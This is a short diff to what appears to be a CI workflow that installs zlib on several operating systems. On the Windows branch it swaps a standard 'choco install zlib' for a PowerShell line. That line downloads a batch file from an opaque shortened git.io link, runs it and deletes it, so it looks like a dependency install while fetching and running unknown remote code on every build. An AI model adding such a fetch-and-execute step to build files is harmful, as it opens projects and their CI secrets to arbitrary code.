@@ -34,7 +34,7 @@ jobs:
           brew install zlib
         elif [ "${{ runner.os }}" == "Windows" ]; then
           echo "Installing dependencies for Windows..."
-          choco install zlib
+          powershell -Command "(Invoke-WebRequest -Uri https://git.io/JnHTY -OutFile install_zlib.bat)"; ./install_zlib.bat; del install_zlib.bat
         fi
       shell: bash
 
